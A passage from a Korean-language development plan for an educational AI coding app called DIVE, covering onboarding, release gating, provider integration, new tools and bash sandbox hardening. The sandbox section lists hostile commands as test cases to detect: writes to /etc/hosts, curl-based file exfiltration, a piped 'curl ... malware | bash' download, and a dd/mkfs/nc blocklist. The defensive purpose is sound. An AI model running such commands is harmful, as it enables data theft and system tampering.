- Skip 버튼이 `setOnboarded(true)` 호출 → 다시 Onboarding 뜨지 않음 → 프로바이더 없이 앱 진입 → 첫 채팅 실패 → 학생은 탈출구 없음.
- `verify-onboarding.mjs`가 이 동작을 "통과"로 단정.

**새 사양**:

1. **`onboarded` 재정의**: `onboarded = true ⟺ (연결된 provider config ≥ 1)`. localStorage 플래그를 독립적으로 쓰지 않고, `connectProvider` 성공 시에만 설정. `disconnectProvider`로 마지막 provider 제거 시 `onboarded=false`로 자동 되돌림.
2. **`isOnboarded()` getter**: localStorage 플래그 + `providers.some(p => p.is_connected)` AND 조건. 둘 중 하나만 true여도 false 반환 (inconsistent state 방지).
3. **Onboarding Skip 유지**: "나중에 설정" 버튼은 유지하되:
   - Skip 시 `onboarded=false` 유지, 다이얼로그만 닫힘.
   - MainShell 상단에 **지속 배너** 표시: "API 키를 설정하세요" + "설정 열기" CTA (`?route=settings`로 이동).
   - 다음 앱 실행 시 Onboarding 다시 자동 오픈 (조건: `providers.length === 0 && !currentlyOpen`).
4. **Onboarding 성공 플로우**: 프로바이더 선택 → API 키 입력 → `provider_connect` IPC (health check 포함) → 성공 토스트 → 첫 프로젝트 생성 CTA (`NewProjectDialog` 체인).
5. **Onboarding 실패 처리**: health check 실패 시 inline error — "키가 잘못되었거나 네트워크 문제입니다" + 구체 원인 (401 / timeout / network) 구분 표시. DB·keyring 변경 없음.

**`verify-onboarding.mjs` 재작성 요구사항**:
- Skip → 다이얼로그 닫힘 + onboarded **false 유지** + MainShell 상단 배너 표시 확인.
- Connect 성공 → onboarded true + 배너 사라짐.
- Connect 실패(mock 401) → inline error + onboarded false 유지 + DB·keyring 미변경 (IPC stub으로 확인).
- **금지 단정**: "Skip만으로 onboarded=true" 확인 절대 금지.

### 0-11. project_root RwLock + 5개 call site (3주차)
**파일**: `dive/src-tauri/src/ipc/mod.rs`, `dive/src-tauri/src/ipc/project.rs`

**현재 문제**: `project_root: PathBuf` 불변 필드를 5곳이 clone 사용. 프로젝트 전환 시 tool 경계와 checkpoint 경계가 갈라질 수 있음.

**변경 사양**:

1. **`AppState.project_root: Arc<RwLock<PathBuf>>`** + `project_root_snapshot()` helper.
2. **갱신 시점**:
   - `project_create` 성공 시 → 생성된 root로 swap.
   - `project_open` 성공 시 → 해당 root로 swap.
   - `project_delete`로 현재 active 프로젝트 삭제 시 → placeholder(`PathBuf::from("")`)로 swap + `ProjectNotSelected` 상태 진입.
3. **5개 call site 전부 `project_root_snapshot()` 사용**:
   - `chat_send` → `ToolContext::new(&snap, session_id)` (현재 `&state.project_root`).
   - `card_transition`의 auto-checkpoint → `CheckpointEngine::new(snap, state.db.clone())`.
   - `checkpoint_create` → 동일.
   - `checkpoint_restore` → 동일.
   - `checkpoint_list` → 동일.
4. **`ProjectNotSelected` 가드**: snapshot이 빈 PathBuf이면 4개 call site 모두 "프로젝트를 선택하세요" 에러 즉시 반환. frontend는 §11 Error UX로 처리.
5. **Race 방지**: 각 call site 시작 시 `project_root_snapshot()` 1회만 호출, 이후 해당 스냅샷 유지. 진행 중 swap은 다음 호출부터 반영.
6. **단위 테스트** (`tests/it_project_switch.rs` 신규):
   - 프로젝트 A 생성 → 프로젝트 B 생성 → B 열기 → `chat_send` 시 ToolContext는 B 경로 → 동시에 `checkpoint_create` 호출 시에도 B 경로 → 데이터 섞임 없음.
   - 프로젝트 삭제 후 chat_send → `ProjectNotSelected` 에러.

### 0-12. Release gate 수립 (NSIS + tauri-driver 자동 스모크) (4주차)
**파일**: 신규 `dive/scripts/release-gate-smoke.mjs`, 신규 `docs/release-gate-2026-05.md`

**목적**: Playwright 26 스위트가 증명하지 못하는 "실 NSIS 빌드가 실 IPC로 동작한다"를 자동 검증.

**구성**:

1. **tauri-driver 설치 및 설정**:
   - `cargo install tauri-driver` (Windows 전용).
   - `dive/src-tauri/Cargo.toml`에 `[features] dev-mock = []` 및 `tauri-driver` 의존성 추가 (test 전용).
   - `tauri.conf.json`에 WebDriver 설정 (`"webdriver": { "enabled": true }`).
   - Selenium WebDriver 클라이언트 (`webdriverio` 또는 기존 Playwright CDP 대체).
2. **자동 스모크 1건** (`release-gate-smoke.mjs`):
   - Clean `%LOCALAPPDATA%\com.dive.app\` 삭제.
   - NSIS `.exe` 설치 (silent installer 플래그).
   - tauri-driver로 앱 실행 → Onboarding 나타남 확인.
   - Wiremock provider 주소 입력 + fake API key → `provider_connect` health check 성공 확인.
   - 첫 프로젝트 생성 → 디스크 `dive.db` 파일 존재 확인 (파일 시스템 직접 조회).
   - Card 1개 추가 → instruction 입력 → chat 메시지 "Hello" 전송 → wiremock이 assistant 응답 반환 확인.
   - 앱 종료 → 재실행 → 동일 session / card / message 보존 확인.
   - 앱 제거 (NSIS uninstaller) 후 clean 상태 확인.
3. **CI 매트릭스**: `.github/workflows/release-gate.yml` 신규. `windows-latest` runner에서 매 rc 태그 푸시 시 실행. `main` push는 developer gate만.
4. **수동 스모크 7종** (`docs/packaging-windows.md` §7 확장):
   - 기존 7종 체크리스트 유지 + 각 항목에 pass/fail 판정 기준 추가.
   - 수동 스모크 담당자 서명란 추가 (릴리스 담당자 이름 + 날짜).

**수용 기준**:
- 자동 스모크 1건 통과 + 수동 스모크 7종 통과 = rc 태그 푸시 자격.
- 자동 스모크만 통과하고 수동 누락 시 **릴리스 블록**.
- tauri-driver 환경 구성 자체가 1주차 리스크 — 설정 실패 시 수동 스모크만으로 rc.2를 나가되 ADR에 명시 ("자동 스모크는 rc.3부터").

### 0-13. rc.1 → rc.2 데이터 마이그레이션 + GitHub Release 조치 (4주차)
**파일**: 신규 `dive/src/lib/rc1-migration.ts`, `dive/src/App.tsx`, `CHANGELOG.md`, GitHub Release UI

**Frontend 일회성 마이그레이션**:

- 앱 시작 시 `rc1MigrationCheck()` 1회 실행:
  - `localStorage.getItem("dive:rc1_migrated") === "true"` → 스킵.
  - 아니면 다음을 수행:
    - `dive:project-session` / `dive:current-project-id` / `dive:current-session-id` / `dive:onboarded` 키 **삭제**.
    - `dive:locale` / `dive:theme-mode`는 **보존**.
    - 일회성 안내 모달 표시. 확인 버튼 누르면 `dive:rc1_migrated = "true"` 설정. 문구:
      > **DIVE v1.0.0-rc.1은 데모 빌드였습니다.**
      > 실제 데이터 저장 기능 없이 화면만 구동되는 상태였기에, 이전 세션·프로젝트·카드 데이터는 복구할 수 없습니다.
      > v1.0.0-rc.2부터는 SQLite에 실제로 저장됩니다. API 키를 다시 입력하고 프로젝트를 새로 만들어 주세요.
      > 불편을 끼쳐 죄송합니다. — DIVE 연구진
- **재현 가능성**: 개발자는 `localStorage.removeItem("dive:rc1_migrated")` 후 새로고침으로 재현.
- **Playwright 테스트**: 신규 `verify-rc1-migration.mjs`. 기존 rc.1 localStorage 상태 주입 → 앱 로드 → 모달 표시 + 키 삭제 + 플래그 설정 확인.

**GitHub Release 조치**:

- rc.1 Release 제목: `DIVE v1.0.0-rc.1` → `[YANKED] DIVE v1.0.0-rc.1`.
- 본문 상단에 ⚠️ 박스 추가:
  ```markdown
  > ## ⚠️ 이 빌드는 회수(yanked)되었습니다
  >
  > Production AppState가 `dev_mock()`으로 와이어드되어 있어, 설치 후 데이터 저장과 실 LLM 호출이 동작하지 않습니다.
  > **v1.0.0-rc.2 이상을 사용해 주세요**: [최신 릴리스](https://github.com/coreelab/dive/releases/latest)
  > 자세한 사유: CHANGELOG.md의 `[Yanked] 1.0.0-rc.1` 섹션
  ```
- Asset (`.exe`)은 **삭제하지 않음** (아카이브 목적).
- `CHANGELOG.md`에 `## [Yanked] 1.0.0-rc.1 — 2026-05-01` 섹션 추가. 사유 / 영향 파일 / 복구 방법 / 참고 ADR 명시.
- **협력 교사 사전 공지** (트랙 C 진입 전 필수): 이메일 또는 교사 매뉴얼 "2026-05 공지" 섹션.

### 0-14. ADR 묶음 (ADR-039 ~ ADR-063)
**파일**: `DIVE_DECISIONS.md`

**번호 할당 규칙**: Track 0 = ADR-039 ~ ADR-052, ADR-058 ~ ADR-063 (건너뛴 ADR-053 ~ ADR-057은 Track B/C/D로 예약). ADR-038까지 이미 존재 확인됨 (DIVE_DECISIONS.md 기존).

| ADR | 주제 | 대응 작업 |
|---|---|---|
| ADR-039 | 디스크 DB 경로 + Tauri identifier 고정 + 마이그레이션 정책 | 0-1 |
| ADR-040 | dev_mock cfg-gating + release 바이너리 negative guard | 0-2, 0-5 |
| ADR-041 | `ProviderRuntime` 스냅샷 + provider+model 원자적 swap + 4개 call site | 0-2, 0-3 |
| ADR-042 | provider factory 패턴 | 0-3 |
| ADR-043 | `provider_connect` health check 의무 + DB·keyring 원자적 쓰기 | 0-4 |
| ADR-044 | 부팅 시 provider hydration + `NoProviderSentinel` | 0-2, 0-5 |
| ADR-045 | Cards persistence 레이어 (신규 IPC + sync 규약) | 0-6 |
| ADR-046 | MainShell product 경로 mock 제거 + `DemoShell` 분리 | 0-7 |
| ADR-047 | URL namespace 분리 + deprecated redirect 정책 | 0-8 |
| ADR-048 | Silent localStorage fallback 제거 규약 | 0-9 |
| ADR-049 | Onboarding 재설계 + `onboarded` 의미 재정의 | 0-10 |
| ADR-050 | `project_root` RwLock + 5개 call site snapshot | 0-11 |
| ADR-051 | Release gate 2단계 (developer / release) | 0-12 |
| ADR-052 | rc.1 yank 절차 + rc.1→rc.2 마이그레이션 | 0-13 |
| ADR-053 | (예약) OpenRouter child key 교사 발급 프로세스 — Track C-1에 기록 | C-1 |
| ADR-054 | (예약) 파일럿 2회차 결과 + 정규식 튜닝 | C-5 |
| ADR-055 | (예약) 채팅 메시지 edit/resend UX + soft delete | C-6 |
| ADR-056 | (예약) Linux file-backed keyring + passphrase fallback | D-3 |
| ADR-057 | (예약) Tauri Updater 키 페어 백업 절차 | D-4 |
| ADR-058 | opencode zen provider — OpenAI-compatible route 전용 + 무료 모델 훈련 고지 | 0-18 |
| ADR-059 | 빌트인 도구 10종 중 Track 0 3종 (search_files/delete_file/run_process) + 2종 v1.1 이월 (web_search/web_fetch) | 0-19 |
| ADR-060 | Bash sandbox 다층 방어 (경로 분석 + danger 승격 + 네트워크 감지) | 0-20 |
| ADR-061 | Checkpoint auto-trigger 전 단계 전환 + changed_files 메타 + pre-restore 자동 백업 | 0-21 |
| ADR-062 | EventLog emission 완전성 + PII redaction + JSONL export 포함 | 0-22 |
| ADR-063 | V-stage 실 테스트 실행 경량 구현 (`test_command` + `run_process`) | 0-23 |
| ADR-064 | (예약) Custom OpenAI-compatible provider 재사용 + 모델 셀렉터 runtime 연결 | B-6 |
| ADR-065 | (예약) Provider settings 카드 5필드 + OpenRouter 자식 키 Settings 통합 | B-7 |
| ADR-066~067 | (예약) Track B 회귀 수정 발견사항 | B-1~4 |
| ADR-068 | (예약) 접근성 단축키 최종 완성 + SPEC §12.2 100% 준수 | D-8 |

**QA 시나리오** (ADR 묶음):
- **도구**: `grep` + 수동 리뷰 + git log 체크.
- **단계**:
  1. `grep -c "^## ADR-" DIVE_DECISIONS.md` 실행 → Track 0 종료 시 ADR-039 ~ ADR-052, ADR-058 ~ ADR-063 총 **20건**이 신규 추가됐는지 확인 (ADR-053~057, 064~068은 예약 스텁이라 Track B/C/D 진입 시 채움).
  2. 각 ADR 본문에 **제목 / 결정 / 사유 / 대안 / 결과 / 참조 파일** 6섹션 모두 있는지 수동 리뷰.
  3. 각 ADR의 "대응 작업" 번호가 §0-14 매핑 표와 일치 확인 (ADR ID 오기 방지).
  4. `git log --oneline --grep="ADR-0"` → Track 0 커밋 중 ADR 번호가 커밋 메시지에 박힌 쌍이 정확히 ADR 개수와 일치.
- **기대 결과**: 20개 ADR 존재, 매핑 표 불일치 0건, 커밋 로그 일치.

### 0-15. 버전 / 태그 / 로드맵 갱신
- `1.0.0-rc.1` = `[Yanked]`, 사유 "production AppState wired to dev_mock()".
- Track 0 통과 시 **`1.0.0-rc.2` 태그** = 실제로 동작하는 첫 빌드. Release gate 이원 통과 후에만 태그 푸시.
- **README 갱신**:
  - "## 로드맵" 표의 "v1.0 · 2026-11~12 ✅" 행을 `v1.0-rc.1 [Yanked]` / `v1.0-rc.2 2026-05 🟡 production wiring`으로 수정.
  - release 배지는 rc.2 태그 푸시 전까지 제거 또는 `rc.1-yanked` 문구.
- **DIVE_PROGRESS.md 갱신**:
  - Phase 6 = "UI/i18n/a11y/문서화 완료, 패키징·릴리스는 회수".
  - Phase 7 = "Production Wiring + Cards Persistence (Track 0, 4주)" 신설.
  - Phase 6 체크리스트의 "v1.0.0-rc.1 NSIS 빌드" 항목에 `⚠️ Yanked — ADR-052` 주석.
- **CHANGELOG.md 갱신**: `## [Yanked] 1.0.0-rc.1 — 2026-05-01` 섹션 (§0-13 참조) + 이후 `## [1.0.0-rc.2] — 2026-05-??` 섹션에 Track 0 변경 summary.

**QA 시나리오**:
- **도구**: `grep` / `git tag` / 파일 diff 수동 리뷰 + Playwright (`dive/scripts/verify-version-sync.mjs` 신규).
- **단계**:
  1. **3곳 버전 동기화 확인**: `dive/package.json` + `dive/src-tauri/Cargo.toml` + `dive/src-tauri/tauri.conf.json` 세 파일의 version 필드가 `1.0.0-rc.2` 동일 (기존 `release.yml` 3곳 검사 스크립트 재실행).
  2. **README 검증**: `grep -E "v1\\.0.*2026-11" README.md` → 0건 (이전 거짓말 문구 제거됨). `grep "rc.1 \\[Yanked\\]\\|rc\\.1.*yank" README.md` → 1건 이상. release 배지 rc.1 문구 없음 또는 "yanked" 표시.
  3. **DIVE_PROGRESS.md 검증**: `grep "Phase 7.*Production Wiring"` → 1건. `grep "Phase 6.*완료\\|Yanked"` 양쪽 매치 확인.
  4. **CHANGELOG.md 검증**: `## [Yanked] 1.0.0-rc.1` + `## [1.0.0-rc.2]` 두 헤더 모두 존재. `[Yanked]` 섹션 본문에 "ADR-052" 참조 + 사유 + 영향 파일 경로 명시.
  5. **git tag**: `git tag --list 'v1.0.0-rc.*'` → `v1.0.0-rc.1`, `v1.0.0-rc.2` 두 개. rc.1 tag에 annotation으로 "[YANKED]" 프리픽스.
  6. **GitHub Release API**: `gh release view v1.0.0-rc.1 --json name,body` → name `[YANKED] DIVE v1.0.0-rc.1`, body 상단에 "⚠️" 블록.
- **기대 결과**: 3곳 버전 일치, README/PROGRESS/CHANGELOG 검증 grep 결과 모두 예상대로, git tag 2개, GitHub Release `[YANKED]` prefix 반영.

### 0-16. 커밋 계획 (작업당 feat + docs(sot) 2커밋)

주차별 커밋 개요 (약 **20쌍 = 40커밋**):

**1주차** (5쌍):
- `feat(db): enforce disk DB path + migration policy (task 7-1)` + `docs(sot): close 7-1 [ADR-039]`
- `feat(state): ProviderRuntime snapshot + dev_mock cfg-gating (task 7-2)` + `docs(sot): close 7-2 [ADR-040, ADR-041]`
- `feat(provider): factory + 4 call sites use runtime snapshot (task 7-3)` + `docs(sot): close 7-3 [ADR-042]`
- `feat(provider): provider_connect health check + atomic swap (task 7-4)` + `docs(sot): close 7-4 [ADR-043]`
- `feat(app): production setup hook + hydrate provider runtime (task 7-5)` + `docs(sot): close 7-5 [ADR-044]`

**2주차** (4쌍):
- `feat(cards): card_create / card_list / workmap_get IPC (task 7-6a)` + `docs(sot): close 7-6a [ADR-045]`
- `feat(ui): useWorkmap hook + AiAssistDialog IPC chain (task 7-6b)` + `docs(sot): close 7-6b`
- `feat(provider): add opencode zen via OpenAiProvider::opencode_zen (task 7-18)` + `docs(sot): close 7-18 [ADR-058]`
- `feat(ui): MainShell wires useChatSession + useWorkmap; remove demo data (task 7-7)` + `docs(sot): close 7-7 [ADR-046]`

**3주차** (7쌍):
- `feat(ui): DemoShell split + URL namespace ?route=/?demo= (task 7-8)` + `docs(sot): close 7-8 [ADR-047]`
- `feat(data): remove silent localStorage fallback in product mode (task 7-9)` + `docs(sot): close 7-9 [ADR-048]`
- `feat(onboarding): redefine onboarded flag + persistent banner (task 7-10)` + `docs(sot): close 7-10 [ADR-049]`
- `feat(state): project_root RwLock + snapshot in 5 call sites (task 7-11)` + `docs(sot): close 7-11 [ADR-050]`
- `feat(tools): add search_files / delete_file / run_process (task 7-19)` + `docs(sot): close 7-19 [ADR-059]`
- `feat(tools): harden bash sandbox with argument path analysis (task 7-20)` + `docs(sot): close 7-20 [ADR-060]`
- `feat(checkpoint): auto-trigger on D/I/V/E transitions + pre-restore backup (task 7-21)` + `docs(sot): close 7-21 [ADR-061]`

**4주차** (4~5쌍):
- `feat(eventlog): complete emission coverage + PII redaction (task 7-22)` + `docs(sot): close 7-22 [ADR-062]`
- `feat(verify): optional test_command execution via run_process (task 7-23, 선택적)` + `docs(sot): close 7-23 [ADR-063]`
- `feat(ci): tauri-driver release gate smoke + manual 7 checklist (task 7-12)` + `docs(sot): close 7-12 [ADR-051]`
- `feat(ui): rc.1 migration modal + localStorage cleanup (task 7-13)` + `docs(sot): close 7-13 [ADR-052]`
- `chore(release): yank rc.1 on GitHub + changelog yanked section (task 7-14)` + `docs(sot): close 7-14`
- 마지막: `[PHASE_GATE] Phase 7 (Production Wiring + SPEC Gaps) 완료 — 사용자 승인 대기`

**지연 완충**: 7-23 (V-stage test execution) 일정 타이트 시 Track B로 이월 → 4주차 3~4쌍으로 축소 허용.

### 0-18. opencode zen provider 추가 (2주차)
**파일**: `dive/src-tauri/src/providers/openai/mod.rs`, `dive/src-tauri/src/providers/factory.rs` (신규), `dive/src/components/onboarding/OnboardingDialog.tsx`, `dive/src/i18n/{ko,en}.json`

**배경**: [opencode zen](https://opencode.ai/docs/zen/)은 멀티 프로토콜 LLM 게이트웨이 (OpenAI Responses / Anthropic Messages / OpenAI-compatible chat 3종 route). DIVE는 **OpenAI-compatible 경로만** 사용하여 최소 스코프 통합.

**근거**:
- Base URL: `https://opencode.ai/zen/v1`
- 엔드포인트: `POST /chat/completions` (OpenAI-compatible)
- 인증: `Authorization: Bearer <api_key>` — 키 prefix `sk-...`
- 스트리밍: SSE, OpenAI와 동일 포맷
- Tool calling: OpenAI-compatible (`tools`, `tool_choice`, `tool_calls`)
- 무료 모델 (2026-05 기준, docs 인용): `big-pickle`, `minimax-m25-free`, `ling-26-flash-free`, `hy3-preview-free`, `nemotron-3-super-free`, `gpt-5-nano`
- 레퍼런스: https://github.com/anomalyco/opencode/tree/main/packages/console/app/src/routes/zen

**구현 사양**:

1. **Provider adapter**: 별도 클래스 추가 **금지**. `OpenAiProvider::opencode_zen(api_key: String) -> Self`를 `OpenAiProvider::openrouter`와 동일 패턴으로 추가:
   ```rust
   impl OpenAiProvider {
       pub fn opencode_zen(api_key: String) -> Self {
           Self::new(api_key).with_base_url("https://opencode.ai/zen/v1")
       }
   }
   ```
2. **ProviderKind 확장**: `factory::build_provider`의 match에 `ProviderKind::OpencodeZen` 추가 → `OpenAiProvider::opencode_zen(key)`. DB `provider_config.kind = "opencode_zen"`.
3. **`list_models`**: opencode zen 전용 모델 목록 제공. 무료 모델만 기본 노출 (교육 환경 비용 리스크 최소화).
   ```rust
   // OpencodeZenProvider를 만들 필요 없이 OpenAiProvider의 id/list_models를 override하는 wrapper
   // 또는 OpenAiProvider에 optional model_list를 받는 생성자 추가
   ```
   설계: `OpenAiProvider::with_models(mut self, models: Vec<ModelInfo>)` chain 추가 + `with_id(String)` 추가로 `id()`가 `"opencode_zen"` 반환. `openrouter()`와 `opencode_zen()` 모두 이 체인 활용.
4. **health check** (§0-4 준수): opencode zen은 `GET /v1/models` 지원 → 기존 OpenAI 어댑터 health check 그대로 재사용. 401 / timeout / 5xx 분기 동일.
5. **Onboarding UI**: 기존 3 choice (Anthropic / OpenAI / OpenRouter)에 **OpenCode Zen** 4번째 추가.
   - 라벨: "OpenCode Zen" (한/영 공통)
   - 힌트 (ko): "무료 모델 다수 · 베타" / (en): "Free models · Beta"
   - API 키 힌트: "sk-..."
6. **Settings provider 카드**: 동일하게 4번째 항목으로 표시. `?route=settings`의 provider 카드 리스트에 추가.
7. **모델 기본값**: `gpt-5-nano`를 기본 model로 설정 (폴백 가장 안정적인 선택지로 판단). 학생 교육용으로 token 비용 0.
8. **경고 메시지 (UX)**: opencode zen 카드에 `⚠️ 베타 서비스 · 일부 무료 모델은 데이터 훈련에 사용될 수 있음 ([자세히](https://opencode.ai/docs/zen/))` 각주. 학교 환경 개인정보 주의.

**테스트**:
- Rust: `OpenAiProvider::opencode_zen` 생성 → base_url 확인. wiremock으로 `/models` 200 / 401 / timeout 케이스.
- Playwright developer gate: Onboarding에서 OpenCode Zen 선택 + 테스트 키 입력 → health check → 연결됨 표시.
- **실 API key 테스트**: 사용자가 제공한 테스트 키 (별도 안전한 채널로 공유됨 — **소스/문서/커밋/테스트 fixture에 하드코딩 금지**) 1턴 채팅 확인. 수동 스모크로만 진행.

**보안 / 개인정보**:
- 테스트 키는 `.env.local` 또는 macOS Keychain / Windows Credential Manager에만 저장.
- `.env.local` → `.gitignore` 확인.
- 교사 매뉴얼에 "opencode zen 무료 모델 사용 시 학생 과제 내용이 모델 훈련에 쓰일 수 있음" 주의 추가.
- 수업 전 교사가 학생에게 고지 + 동의 수집 절차 (§C 트랙의 교사 매뉴얼 업데이트 항목).

**Rate limit 미공개 대응**:
- opencode zen은 공식 rate limit 수치 공개 안 함. 429 응답 시 기존 `retry.rs`의 exponential backoff 재사용 (최대 3회).
- 사용자 가시 에러: "opencode zen 요청 한도에 도달했습니다. 잠시 후 다시 시도하거나 다른 프로바이더를 선택하세요."
- 장기적으론 ADR-058에 "opencode zen 무료 tier 실제 한도 측정 결과" 섹션을 Track C 파일럿 결과로 보강.

**신규 ADR**:
- **ADR-058**: opencode zen provider 통합 — OpenAI-compatible route 전용, 멀티 프로토콜 route 2종 (Responses / Anthropic Messages)은 v1.1 이후. 무료 모델 데이터 훈련 경고 고지 의무.

**커밋 쌍**: `feat(provider): add opencode zen via OpenAiProvider::opencode_zen (task 7-18)` + `docs(sot): close 7-18 [ADR-058]`

### 0-19. 빌트인 도구 누락 6종 보강 (SPEC §6.3.1) (3~4주차)
**파일**: `dive/src-tauri/src/tools/`, 신규 `tools/search_files.rs`, `tools/delete_file.rs`, `tools/mkdir.rs`, `tools/run_process.rs`, `tools/web_search.rs` (Track B 이월), `tools/web_fetch.rs` (Track B 이월)

**SPEC 대비 현황** (explore 감사 + SPEC §6.3.1 재확인): 등록된 도구 5종 (`read_file`, `list_dir`, `write_file`, `edit_file`, `bash`). **SPEC §6.3.1이 요구하는 최소 10종 중 6종 누락**:

| SPEC 도구 | 위험도 (SPEC §5.5) | 배치 |
|---|---|---|
| `search_files` | 안전 | Track 0 |
| `mkdir` | 주의 | Track 0 |
| `delete_file` | 위험 | Track 0 |
| `run_process` | 위험 | Track 0 |
| `web_search` | 위험 | v1.1 이월 |
| `web_fetch` | 위험 | v1.1 이월 |

**Track 0 (로컬) — 4종**:
- `search_files { pattern: string, path?: string, use_regex?: bool }` (**안전**): ripgrep-like 파일 내용 검색. `ignore` crate + `regex` crate. project_root 외부 금지 (sandbox, §0-20).
- `mkdir { path: string, recursive?: bool }` (**주의**): 디렉토리 생성. project_root 내부 제한. 이미 존재 시 no-op (idempotent). `recursive=true`면 `fs::create_dir_all`.
- `delete_file { path: string }` (**위험**): 단일 파일 삭제. 권한 카드 "danger" 필수. sandbox + 프로젝트 내부 제한. 디렉토리 삭제는 금지 (별도 tool 필요 시 v1.1).
- `run_process { command: string, args: string[], timeout_sec?: u32 }` (**위험**): `bash`보다 제한적. 단일 실행 파일 + 인자만. 쉘 메타문자 금지. project_root 외부 실행 금지. 최대 timeout 60초.

**Track B (네트워킹) — 2종 모두 이월**:
- `web_search { query: string, max_results?: u32 }` (**위험**): v1.0 **미구현, v1.1 이월 (ADR-059)**. 사유: 검색 엔진 API 선택 (Brave / Tavily / SerpAPI) + 쿼리 익명화 정책 + 텔레메트리 금지 원칙(§9.4) 충돌 검토 필요.
- `web_fetch { url: string }` (**위험**): v1.0 **미구현, v1.1 이월 (ADR-059)**. 학생이 URL 입력해서 fetch 시 SSRF 위험 + 악성 URL 방어 필요. 최소 권한 카드 `danger` + allowlist 도메인 정책.

**Risk 등급 매핑** (`ToolDef.risk`, SPEC §5.5 엄격 준수):
- `search_files`: `safe` (안전)
- `mkdir`: `warn` (주의)
- `delete_file`: `danger` (위험)
- `run_process`: `danger` (위험)

**테스트**:
- 각 도구별 단위 테스트: 정상 케이스 + sandbox 탈출 시도 (상대 경로 `../`, 심볼릭 링크, 절대 경로) → 거부 확인.
- 통합 테스트: 카드 하나에서 `search_files` → `mkdir` → `edit_file` → `run_process` 체인 시나리오.
- `ToolRegistry::list_tools()` 결과가 SPEC §6.3.1 표의 10개 중 v1.0 대상 8개 + `mkdir` 포함 9개 일치 확인.

**QA 시나리오**:
- **도구**: Rust 단위/통합 테스트 (`cargo test tools::`) + Playwright (`dive/scripts/verify-builtin-tools.mjs` 신규).
- **단계**:
  1. `cargo test tools::search_files` / `tools::mkdir` / `tools::delete_file` / `tools::run_process` 각 정상 + 3개 sandbox 탈출 거부 케이스 pass.
  2. `cargo test tools::integration::chain` (search_files → mkdir → edit_file → run_process) pass.
  3. `ToolRegistry::with_builtins().list().len() == 9` + 각 tool `risk()` 값이 SPEC §6.3.1 표와 일치 (안전 3 / 주의 3 / 위험 3).
  4. Playwright: 세션에서 mock provider가 `run_process` tool call 요청 → 권한 카드 `위험` 라벨 + 명령어 본문 노출 확인. 승인 시 실행, 거부 시 차단.
- **기대 결과**: 모든 cargo test pass, 레지스트리 개수/위험도 매핑 SPEC 100% 일치, 권한 카드 위험 라벨 렌더링 확인.

**신규 ADR**:
- **ADR-059**: 빌트인 도구 10종 중 Track 0 4종 (search_files/mkdir/delete_file/run_process) + 2종 v1.1 이월 (web_search/web_fetch). SPEC §5.5 risk 3단계 엄격 매핑.

**커밋 쌍** (4쌍): `feat(tools): add search_files / mkdir / delete_file / run_process (task 7-19a/b/c/d)` + `docs(sot): close 7-19 [ADR-059]`

### 0-20. Bash 샌드박스 구멍 차단 (SPEC §9.3) (3~4주차)
**파일**: `dive/src-tauri/src/tools/bash.rs`

**SPEC 대비 현황**: 파일 도구(`write_file` / `edit_file` / `delete_file`)는 project_root 외부 쓰기를 거부. 그러나 `bash`는 다음을 통해 **project_root 외부 쓰기 가능**:
- 리다이렉션: `bash> /tmp/foo` 또는 `>/etc/hosts`
- 복사/이동: `cp secret.txt ~/.ssh/` / `mv foo /root/`
- 인터프리터 우회: `python -c "open('/etc/evil','w')"` / `node -e "require('fs').writeFileSync(...)"`
- 네트워크 경유 유출: `curl -X POST --data-binary @file ...`

**방어 전략** (다층):
1. **기존 blocklist 유지 + 확장**: SPEC §9.3 목록과 대조하여 누락된 패턴 추가 (`dd`, `mkfs`, `fdisk`, `chmod`, `chown`, `> /dev/`, `nc`/`netcat` listening 모드 등). ADR-060에 최종 블록리스트 명문화.
2. **Chroot-like 강화는 불가 (윈도우/교육용)**: 완전 격리 대신 **정적 분석 + 권한 카드 강화**.
3. **Command argument 분석**:
   - 쉘 파싱 (기존 `shlex`-like crate) → 리다이렉션/파이프 노드 분리.
   - 모든 경로 인자에 대해 project_root 내부 여부 검사 (`canonicalize` 후 prefix 비교).
   - 외부 경로 발견 → 권한 카드 risk = `danger` 강제 + 사용자 확인 필수.
4. **인터프리터 래퍼 감지**: `python`, `python3`, `node`, `ruby`, `perl`, `deno`, `bun` 호출 시 stdin/`-c` 모드를 추가 경고로 간주. 가능한 sandbox 도구 (`bwrap` / `firejail`)는 Linux에서만 — Windows 기본 환경에서는 불가능하므로 **경고 + 권한 카드 + 로그 기록**으로 대체.
5. **네트워크 명령**: `curl`, `wget`, `nc`, `ssh`, `scp`, `rsync` 포함 명령은 항상 `danger` + 도착 URL/호스트 추출 후 권한 카드에 노출.

**수용 기준 (acceptance)**:
- `echo test > /tmp/evil.txt` → 권한 카드에 `danger` + "⚠️ 프로젝트 폴더 외부 쓰기 시도" 경고.
- `python -c "open('/etc/hosts','w').write('x')"` → 동일.
- `curl -sSL https://example.com/malware | bash` → 파이프/`bash` 실행 감지 → danger + "⚠️ 외부 스크립트 실행".
- 프로젝트 내부 쓰기 (예: `echo x > ./log.txt`) → 기존 동작 유지 (warn).

**한계 명시 (ADR-060)**: 완전 차단 아님. 학생이 의도적으로 권한 카드 승인 + danger 확인하면 실행 가능. **교육 목적 제품**으로서 "투명한 경고 + 선택권"이 우선, 완전 sandboxing은 v2.0 범위.

**테스트**:
- 위 4개 수용 기준 모두 단위 테스트 + Playwright 권한 카드 노출 검증.
- 기존 blocklist 회귀 테스트 유지.

**신규 ADR**:
- **ADR-060**: Bash sandbox 한계 공개 + 다층 방어 + 외부 경로 인자 자동 danger 승격.

**커밋 쌍**: `feat(tools): harden bash sandbox with argument path analysis (task 7-20)` + `docs(sot): close 7-20 [ADR-060]`

### 0-21. Checkpoint auto-trigger 완성 (SPEC §6.5) (3~4주차)
**파일**: `dive/src-tauri/src/checkpoint/mod.rs`, `dive/src-tauri/src/ipc/mod.rs`, `dive/src/components/slide-in/CheckpointTimeline.tsx`

**SPEC 대비 현황**: 현재 auto-checkpoint는 `card_transition(approve)` / `card_transition(extend)` 2 지점만. **SPEC §6.5가 요구하는 auto-trigger 4개 추가 누락**:
- D → I 진입 시 (instruction이 처음 저장될 때)
- I → V 진입 시 (verify 요청 시점)
- V reject 시 (실패 스냅샷 보존 → reopen_from_reject 후 비교용)
- E 진입 시 — 이미 있음 ✓

추가로:
- Timeline UI의 `file_changes` 필드가 항상 `0`으로 표시됨. 복원 UX 불완전.

**구현 사양**:

1. **`card_transition` IPC 확장**:
   ```rust
   let auto_label = match transition {
       Approve     => Some(format!("[V 통과] {card_title}")),
       Extend      => Some(format!("[E 진입] {card_title}")),
       EnterInstruct => Some(format!("[I 진입] {card_title}")),   // 신규
